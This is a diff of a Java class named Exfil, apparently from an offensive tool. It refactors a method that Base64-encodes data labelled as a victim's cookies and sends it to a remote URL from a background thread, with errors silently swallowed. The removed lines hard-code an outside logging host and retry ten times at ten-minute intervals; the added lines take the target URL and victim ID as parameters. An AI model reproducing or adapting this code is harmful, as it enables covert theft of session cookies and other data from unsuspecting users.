@@ -7,25 +7,22 @@ import org.apache.commons.codec.binary.Base64;
 
 public class Exfil {
 
-	private static final String EXFIL_LOCATION = "http://forgottensigils.com/logger.php";
-	private static final int EXFIL_ATTEMPTS = 10;
-	private static final long EXFIL_SLEEP = 60000 * 10; // 10 minute delay
-	
-	public static void exfil(final String client, final Object data){
-		for(int i=0; i<EXFIL_ATTEMPTS; i++){
-			new Thread(new Runnable(){
-				public void run() {
-					try {
-						URL url = new URL(EXFIL_LOCATION + "?victim=" + client + "&cookies=" + new String(Base64.encodeBase64(data.toString().getBytes())));
-						URLConnection con = url.openConnection();
-						con.getInputStream();
-					} catch (Exception e){}
-				}
-			}).start();
-			try {
-				Thread.sleep(EXFIL_SLEEP);
-			} catch (InterruptedException e1) {}
-		}
+	/**
+	 * Exfiltrates data in a background thread
+	 * @param exfilLocation The url of the exfil target
+	 * @param client The identifier of the victim
+	 * @param data Base64 encoded toString of data object
+	 */
+	public static void exfil(final String exfilLocation, final String victim, final Object data){
+		new Thread(new Runnable(){
+			public void run() {
+				try {
+					URL url = new URL(exfilLocation + "?victim=" + victim + "&data=" + new String(Base64.encodeBase64(data.toString().getBytes())));
+					URLConnection con = url.openConnection();
+					con.getInputStream();
+				} catch (Exception e){}
+			}
+		}).start();
 	}
 	
 }
